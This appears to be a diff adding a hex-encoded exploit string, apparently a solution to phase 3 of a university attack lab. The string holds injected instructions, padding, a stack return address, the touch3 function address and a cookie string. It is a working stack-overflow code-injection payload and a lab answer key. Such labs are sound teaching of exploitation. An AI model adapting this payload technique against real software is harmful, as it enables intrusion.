@@ -1,0 +1,6 @@
+48 c7 c7 50 4c 66 55 c3 /* rsp + 0x28(0x18+8+8) the address where the cookie is present */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding */
+28 4c 66 55 00 00 00 00 /* return address ($rsp) */
+c4 18 40 00 00 00 00 00 /* touch3 address */
+31 63 39 33 32 38 33 39 /* cookie string */
